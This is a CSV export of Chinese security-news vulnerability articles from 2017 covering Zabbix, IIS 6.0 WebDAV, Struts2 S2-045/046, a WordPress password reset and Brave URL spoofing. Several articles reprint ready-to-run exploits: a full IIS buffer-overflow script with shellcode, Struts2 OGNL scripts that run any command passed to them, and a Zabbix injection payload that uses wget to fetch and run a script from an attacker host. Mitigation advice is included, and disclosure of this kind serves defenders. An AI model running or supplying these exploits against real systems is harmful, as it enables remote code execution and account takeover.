"5ccbf9b74f2f0a0a7a69bfb0","zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。","Silence","关于Zabbixzabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营;并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。漏洞描述Zabbix Server Active Proxy Trapper 远程代码执行漏洞 (CVE-2017-2824)★★★★ Zabbix 2.4.x中的trapper command功能存在一处代码执行漏洞，特定的数据包可造成命令注入，进而远程执行代码，攻击者可以从一个Zabbix proxy 发起请求从而促发漏洞。漏洞细节该漏洞位于Zabbix中“Trapper”代码部分，它的主要功能是允许Proxy和Server进行通信的网络服务（TCP端口10051）Zabbix Server提供了一组针对Zabbix Proxy的API调用，两个将讨论的是“discovery data”和“request command”。这些请求的示例数据如下所示：'{""request"":""command"",""scriptid"":1,""hostid"":10001}''{""request"":""discovery data"",""host"":""zabbix-proxy.com"",""clock"":10,""data"":[{""clock"":10,""drule"":1,""dcheck2,""type"":0,""ip:10.0.0.1, ""dns"":""zabbix-agent.com"",    port"":10050,""key"":""test"",""status"":0,""value"":""test_value""}]}应该注意的是，request命令调用位于Zabbix数据库中的脚本，而不进行任何身份验证。该漏洞的另一个关键方面是，默认情况下，Zabbix 2.4.X使用脚本以下表中的3个脚本填充MySQL数据库：# scriptid == 1 == /bin/ping -c {HOST.CONN} 2&gt;&amp;1# scriptid == 2 == /usr/bin/traceroute {HOST.CONN} 2&gt;&amp;1# scriptid == 3 == sudo /usr/bin/nmap -O {HOST.CONN} 2&gt;&amp;1问题在于，在调用脚本时，{HOST.CONN}字段实际上被host的IP地址替换。替换{HOST.CONN}的值位于Zabbixinterface表中，然后保存成VARCHAR（64）类型的“IP”字段。因此，如果攻击者可以使用命令注入创建接口作为IP地址，并且通过“命令”请求的方式运行{HOST.CONN}脚本，则将发生命令注入，并且可以获得反向shell。这个难题在于有效地将值插入到Zabbixhost表。默认情况下，未经身份验证的攻击者无法做到这一点，它需要系统管理员的一个次要配置，特别是关于Zabbix自动发现功能。Zabbix自动发现和自动注册功能允许根据Zabbix Proxy提供的Zabbix Server数据进行Zabbix Server的配置。更具体地说，如果主机根据服务器的配置向Zabbix Proxy提供某些特性，则可能会采取某些操作，其中一个会使新发现的主机被添加到某些Zabbix数据库表中。在这种情况下，主机将被插入到“host”表中，并且将创建一个入口到Zabbixinterface表中，主机提供的IP地址插入到IP列中，而不会对该IP地址的任何验证。因此，通过使用合适的主机向服务器发送一个发现数据请求，可以将命令注入插入到数据库中： write_script_cmd='{""request"":""discoverydata"",""host"":""zabbix-proxy.domain.fake"",""clock"":148535399,""data"":[{""clock"":1485353070,""drule"":88,""dcheck"":174,""type"":0,""ip"":"";wget -O/tmp/shttp://attacker-ip/s;#"",""dns"":""host28.domain.fake"",""port"":10050,""key"":""sectest"",""status"":0,""value"":""lnx&lt;(^_^)&gt;host""}]}'由于ZabbixInterface表的ip字段的大小限制，第二个主机被插入到另一个IP地址的表中。// Host 2ip:/bin/bash /tmp/s;#在这两个主机被添加之后，仍然有一个问题，即不知道该hostid的command请求，但是这很容易解决了。暴力请求入数据库，因为不同的命令请求会返回不同的响应，确定主机是否存在，一旦存在的主机被确定，就可以直接调用它们，并且可以获得反向的shell。命令请求如下所示run_cmd = '{""request"":""command"",""scriptid"":1,""hostid"":14666}'缓解措施删除Zabbix数据库中的默认脚本条目，可以直接操作数据库删除 sql 为： use zabbix; delete * from scripts;  ，也可使用图形界面删除 (Administration-&gt;Scripts-&gt;Checkmarks-&gt;Delete Selected).Zabbix Proxy 数据库写入漏洞(CVE-2017-2824)Zabbix 2.4.x中的trapper功能存在一处数据库写漏洞，特定的恶意trapper数据包可通过database 的逻辑检查，造成数据库写入，攻击者可通过中间人的方式修改zabbix  proxy 和 Server间的请求来触发漏洞。影响版本   Zabbix 2.4.7 - 2.4.8r1参考http://blog.talosintelligence.com/2017/04/zabbix-multiple-vulns.htmlhttp://www.talosintelligence.com/reports/TALOS-2017-0325/http://www.talosintelligence.com/reports/TALOS-2017-0326/https://support.zabbix.com/browse/ZBX-12075https://support.zabbix.com/browse/ZBX-12076","2017-04-28","漏洞发布","Zabbix爆远程代码执行漏洞、数据库写入高危漏洞","http://nsoad.com/Article/exploit/20170428/vulzone-56.html"
"5ccbf9b74f2f0a0a7a69bfb1","IIS 6.0刚刚被曝存在缓冲区溢出漏洞，可致远程代码执行。该漏洞自2016年7、8月起就已被利用。","kuma","漏洞描述微软方面也已经确认了该漏洞：Windows Server 2003R2版本IIS6.0的WebDAV服务中的ScStoragePathFromUrl函数存在缓存区溢出漏洞，远程攻击者通过以“If: &lt;http://”开头的长header PROPFIND请求，执行任意代码。该漏洞自2016年7、8月起就已被利用。由于开启WebDAV服务就存在该漏洞，所以对于目前的IIS 6.0用户而言，可用的变通方案就是关闭WebDAV服务。漏洞编号CVE-2017-7269其他信息ScStoragePathFromUrl函数被调用两次影响版本Windows Server 2003 R2攻击向量修改过的PROFIND数据漏洞发现者Zhiniang Peng和Chen Wu（华南理工大学计算机科学与工程学院信息安全实验室）PoC#------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous.#written by Zhiniang Peng and Chen Wu. Information Security Lab &amp; School of Computer Science &amp; Engineering, South China University of Technology Guangzhou, China #-----------Email: edwardz@foxmail.comimport socket  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  sock.connect(('127.0.0.1',80))  pay='PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n'pay+='If: &lt;http://localhost/aaaaaaa'pay+='\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'pay+='&gt;'pay+=' (Not &lt;locktoken:write1&gt;) &lt;http://localhost/bbbbbbb'pay+='\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81'shellcode='VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA'pay+=shellcodepay+='&gt;\r\n\r\n'print paysock.send(pay)  data = sock.recv(80960)  print data sock.close","2017-03-28","漏洞发布","【漏洞预警】IIS 6.0曝远程代码执行漏洞CVE-2017-7269","http://nsoad.com/Article/exploit/20170328/vulzone-53.html"
"5ccbf9b74f2f0a0a7a69bfb2","近日，安全研究人员发现著名J2EE框架——Struts2存在远程代码执行的漏洞，Struts2官方已经确认该漏洞（S2-045,S2-046），并定级为高危漏洞。","安全客","背景介绍近日，安全研究人员发现著名J2EE框架——Struts2存在远程代码执行的漏洞，Struts2官方已经确认该漏洞（S2-045,S2-046），并定级为高危漏洞。Struts2 的使用范围及其广泛，国内外均有大量厂商使用该框架。Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。（来源：百度百科）漏洞描述使用Jakarta插件处理文件上传操作时可能导致远程代码执行漏洞。S2-045漏洞影响攻击者可以通过构造HTTP请求头中的Content-Type值可能造成远程代码执行。S2-045PoC_1（来源于网络：http://www.cnblogs.com/milantgh/p/6512739.html  ）#! /usr/bin/env python# encoding:utf-8import urllib2import sysfrom poster.encode import multipart_encodefrom poster.streaminghttp import register_openersdef poc():    register_openers()    datagen, header = multipart_encode({""image1"": open(""tmp.txt"", ""rb"")})    header[""User-Agent""]=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36""    header[""Content-Type""]=""%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}""    request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)    response = urllib2.urlopen(request)    print response.read()poc()S2-046漏洞影响（更新）触发条件上传文件的大小（由Content-Length头指定）大于Struts2默认允许的最大大小（2M）。header中的Content-Disposition中包含空字节。文件名内容构造恶意的OGNL内容。S2-046PoC（来源于网络：https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723# ）POST /doUpload.action HTTP/1.1Host: localhost:8080Content-Length: 10000000Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9zConnection: close ------WebKitFormBoundaryAnmUgTEhFhOZpr9zContent-Disposition: form-data; name=""upload""; filename=""%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}""Content-Type: text/plainKaboom  ------WebKitFormBoundaryAnmUgTEhFhOZpr9z--S2-046PoC_2（来源于网络：https://gist.githubusercontent.com/frohoff/a3e24764561c0c18b6270805140e7600 ）#!/bin/bash url=$1cmd=$2shiftshift boundary=""---------------------------735323031399963166993862150""content_type=""multipart/form-data; boundary=$boundary""payload=$(echo ""%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='""$cmd""').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"") printf -- ""--$boundary\r\nContent-Disposition: form-data; name=\""foo\""; filename=\""%s\0b\""\r\nContent-Type: text/plain\r\n\r\nx\r\n--$boundary--\r\n\r\n"" ""$payload"" | curl ""$url"" -H ""Content-Type: $content_type"" -H ""Expect: "" -H ""Connection: close"" --data-binary @- $@验证截图修复建议1. 严格过滤 Content-Type 、filename里的内容，严禁ognl表达式相关字段。2. 如果您使用基于Jakarta插件，请升级到Apache Struts 2.3.32或2.5.10.1版本。（强烈推荐）官网公告https://cwiki.apache.org/confluence/display/WW/S2-045https://cwiki.apache.org/confluence/display/WW/S2-046补丁地址Struts 2.3.32：https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32 Struts 2.5.10.1：https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1 参考http://struts.apache.org/docs/s2-045.htmlhttp://struts.apache.org/docs/s2-046.htmlhttps://gist.githubusercontent.com/frohoff/a3e24764561c0c18b6270805140e7600https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723#","2017-03-21","漏洞发布","Struts 2 远程代码执行漏洞(s2-045\s2-046) (含PoC)","http://nsoad.com/Article/exploit/20170321/vulzone-52.html"
"5ccbf9b74f2f0a0a7a69bfb3","这次的漏洞又是个RCE远程代码执行漏洞。简单来说，基于Jakarta Multipart解析器进行文件上传时，利用漏洞可进行远程代码执行。 该漏洞由安恒信息Nike Zheng上报。","漏洞盒子","FreeBuf上次曝Struts 2的漏洞已经是半年多以前的事情了。这次的漏洞又是个RCE远程代码执行漏洞。简单来说，基于Jakarta Multipart解析器进行文件上传时，利用漏洞可进行远程代码执行。 该漏洞由安恒信息Nike Zheng上报。Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web应用的开源MVC框架。    漏洞编号CVE-2017-5638漏洞简介Struts使用的Jakarta解析文件上传请求包不当，当远程攻击者构造恶意的Content-Type，可能导致远程命令执行影响范围 Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10修复方案如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到Apache Struts 2.3.32或2.5.10.1版；或者也可以切换到不同的实现文件上传Multipart解析器。POC:#! /usr/bin/env python# encoding:utf-8import sys,urllib2data = '--447635f88b584ab6b8d9c17d04d79918\Content-Disposition: form-data; name=""x""\Content-Type: text/plain; charset=utf-8\\x\--447635f88b584ab6b8d9c17d04d79918--'request = urllib2.Request(str(sys.argv[1]),data,headers={})request.add_header(""Content-Length"",""10"")request.add_header(""User-Agent"",""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"")request.add_header(""Content-Type"",""%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"".replace(""whoami"",sys.argv[2]))response = urllib2.urlopen(request)print response.read()","2017-03-07","漏洞发布","Apache Struts2 曝任意代码执行漏洞 (S2-045,CVE-2017-5638)附POC","http://nsoad.com/Article/exploit/20170307/vulzone-51.html"
"5ccbf9b74f2f0a0a7a69bfb4","Wordpress的重置密码功能存在漏洞，在某些情况下（利用难度较高）不需要使用之前的身份令牌验证获取密码重置链接。","Kong","漏洞提交者：Dawid Golunski漏洞编号：CVE-2017-8295发布日期：2017-05-03修订版本：1.0漏洞危害：中/高I. 漏洞WordPress内核&lt;= 4.7.4存在未经授权的密码重置(0day)II. 背景WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和内容管理系统。截止2017年2月，Alexa排名前1000万的站点中约有27.5%使用该管理系统。据报道有超过6000万站点使用WordPress进行站点管理或者作为博客系统。III. 介绍WordPress的重置密码功能存在漏洞，在某些情况下不需要使用之前的身份令牌验证获取密码重置链接。    该攻击可导致攻击者在未经授权的情况下获取用户Wordpress后台管理权限。IV. 描述该漏洞源于WordPress默认使用不可信的数据。当生成一个密码重置邮件时应当是仅发送给与帐户相关联的电子邮件。    从下面的代码片段可以看出，在调用PHP mail()函数前创建了一个From email头 ------[ wp-includes/pluggable.php ]------...if ( !isset( $from_email ) ) {        // Get the site domain and get rid of www.        $sitename = strtolower( $_SERVER['SERVER_NAME'] );        if ( substr( $sitename, 0, 4 ) == 'www.' ) {                $sitename = substr( $sitename, 4 );        }        $from_email = 'wordpress@' . $sitename;}...-----------------------------------------正如我们所看到的，Wordpress为了生成重置邮件创建的一个From/Return-Path(发件人/收件人)头，使用SERVER_NAME变量以获取服务器的主机名。    然而，诸如Apache的主流web服务器默认使用由客户端提供的主机名来设置SERVER_NAME变量（参考Apache文档）    由于SERVER_NAME可以进行修改，攻击者可以任意设置该值，例如attackers-mxserver.com    这将导致Wordpress的$from_email变为wordpress@attackers-mxserver.com，最终导致包含From/Return-Path(发件人/收件人)设置的密码重置邮件发送到了该恶意邮件地址。    至于攻击者可以修改哪那一封电子邮件的头信息，这取决于服务器环境（参考PHP文档）    基于邮件服务器的配置，可能导致被修改过邮件头的恶意收件人/发件人地址的电子邮件发送给WordPress用户。    这使得攻击者能够在不需要进行交互就可以截取本该是需要进行交互才能进行的操作的密码重置邮件。 攻击场景：如果攻击者知道用户的电子邮件地址。为了让密码重置邮件被服务器拒收，或者无法到达目标地址。他们可以先对用户的电子邮件帐户进行DoS攻击（通过发送多个超过用户磁盘配额的大文件邮件或攻击该DNS服务器）某些自动回复可能会附加有邮件发送副本发送多封密码重置邮件给用户，迫使用户对这些没完没了的密码重置邮件进行回复，回复中就包含的密码链接会发送给攻击者。V. POC如果攻击者将类似下面的请求发送到默认可通过IP地址访问的Wordpress安装页面(IP-based vhost): -----[ HTTP Request ]----POST /wp/wordpress/wp-login.php?action=lostpassword HTTP/1.1Host: injected-attackers-mxserver.comContent-Type: application/x-www-form-urlencodedContent-Length: 56user_login=admin&amp;redirect_to=&amp;wp-submit=Get+New+Password------------------------WordPress将触发管理员账户的密码重置功能    由于修改了主机头，SERVER_NAME变量将被设置为攻击者所选择的主机名，因此Wordpress会将以下电子邮件头信息和正文传递给/usr/bin/sendmail ------[ resulting e-mail ]-----Subject: [CompanyX WP] Password ResetReturn-Path: &lt;wordpress@attackers-mxserver.com&gt;From: WordPress &lt;wordpress@attackers-mxserver.com&gt;Message-ID: &lt;e6fd614c5dd8a1c604df2a732eb7b016@attackers-mxserver.com&gt;X-Priority: 3MIME-Version: 1.0Content-Type: text/plain; charset=UTF-8Content-Transfer-Encoding: 8bit有人请求将以下账户的密码进行重置： http://companyX-wp/wp/wordpress/Username: admin如果是弄错了，直接忽略该邮件就好。重置密码请访问以下地址： http://companyx-wp/wp/wordpress/wp-login.php?action=rp&amp;key=AceiMFmkMR4fsmwxIZtZ&amp;login=admin%3E正如我们看到的，Return-Path, From, 以及Message-ID字段都是攻击者控制的域    通过bash脚本替换/usr/sbin/sendmail以执行头的验证： #!/bin/bashcat &gt; /tmp/outgoing-emailVI. 业务影响在利用成功的基础上，攻击者可重置用户密码并且未经授权获取WordPress账户访问权限。VII. 系统影响WordPress至最新版本4.7.4全部受影响VIII. 解决方案目前没有官方解决方案可用。作为临时解决方案，用户可以启用UseCanonicalName执行SERVER_NAME静态值（参考Apache）IX. 参考文献https://legalhackers.comhttps://ExploitBox.ioVendor site:https://wordpress.orghttp://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalnamehttp://php.net/manual/en/function.mail.phphttps://tools.ietf.org/html/rfc5321","2017-05-05","漏洞发布","WordPress曝未经授权的密码重置漏洞（CVE-2017-8295 ）","http://nsoad.com/Article/exploit/20170505/vulzone-57.html"
"5ccbf9b84f2f0a0a7a69bfb5","近日，Hackerone上的安全人士披露了尘封3个月的Brave浏览器漏洞","cxt","愿这头雄狮能克服自身的缺点不断成长，让用户在上网时不再畏惧潜在的威胁。作为一款开源软件，Brave一直以广告拦截，防cookie追踪、像素追踪等安全特性著称。产品安全一直被开发者视为重中之重，他们在Hackerone平台就开设了bug有奖征集项目，鼓励广大的网络安全人士参与到提高产品可靠性的活动中来。本次漏洞正是由安全研究人员Aaditya Purani在Hackerone平台上首先披露的。他发现攻击者可以利用浏览器漏洞伪造网页进行网址欺骗，一旦用户点击访问就可能泄漏个人信息，攻击者更可以在虚假页面上实施挂马和钓鱼等行为。简而言之，受害者看到地址栏里还是熟悉的网址，但页面内容却是由黑客控制的。“我们本以为地址栏已经是唯一信得过的安全提示了”，许多公司这样感叹道。重现漏洞下面是Purani 如何操作的：首先他写了一个网址来伪造Brave浏览器地址栏（bravespoof.html）。为了模拟受害者环境，他还在这个网址里包含了一个要求用户提供登录名和密码的表单。接下来的关键在于，他使用函数f()指向https://facebook.com，并且设定setInterval函数每10ms执行一次f()。通常情况下，这种做法会使得用户访问该网址时，URL和页面内容每隔10ms都会跳转到https://facebook.com（当然也有时无论URL或页面都没有任何跳转，但这两种情况显然都是安全的）。但是Purani发现，当使用Brave浏览器访问上述地址时，事情却没有这么简单。事实上，无论你通过Android还是IOS的Brave客户端去访问他构造好的网址，URL都会跳转到https://facebook.com（你可以看到甚至还有绿锁安全认证），但页面却还是Purani预先写好的内容。这就意味着，某个习惯通过地址栏来判断安全性的用户很可能不经意间就把帐号密码泄漏给了虚假页面之后的黑客。（当然了黑客需要把网页做的更逼真一些:P）其他浏览器反应如何？在Purani对Chrome的测试中，浏览器并没有更改URL到https://facebook.com，而是依旧停留在他伪造的网址上。Mozilla也给出了同样反应。但最让Purani满意的还是UC Mini（安卓平台）——无论网址还是页面都直接跳转到了https://facebook.com，将攻击消弭于无形。当然了，Safari也没有受此影响。如果你对完整漏洞报告感兴趣，戳这里没错，在他的一系列测试中，只有Brave悲剧了。受此漏洞影响的版本如下：IOS Version 1.2.16（16.09.30.10）Android Version 1.9.56如果看到这里的你正使用上述受到影响的版本…也不用担心，因为这份漏洞报告是直到3个月后（的今天）才被公布出来的，而Brave安全团队早已于发现一周内修复了这个问题，因此暂无负面影响。当然，好处还是有的——Purani本人因此获得了200$的奖金。在此之前Purani也曾向一众企业和机构提交多起高危安全漏洞，如WordPress Mobile Detector插件漏洞等。白帽子和安全平台的合作不仅协助了众多中小企业改善企业的安全环境，也让白帽子们收获颇丰。","2017-01-30","漏洞发布","Brave浏览器被曝安全漏洞：黑客可伪造网址欺骗用户","http://nsoad.com/Article/exploit/20170130/vulzone-50.html"
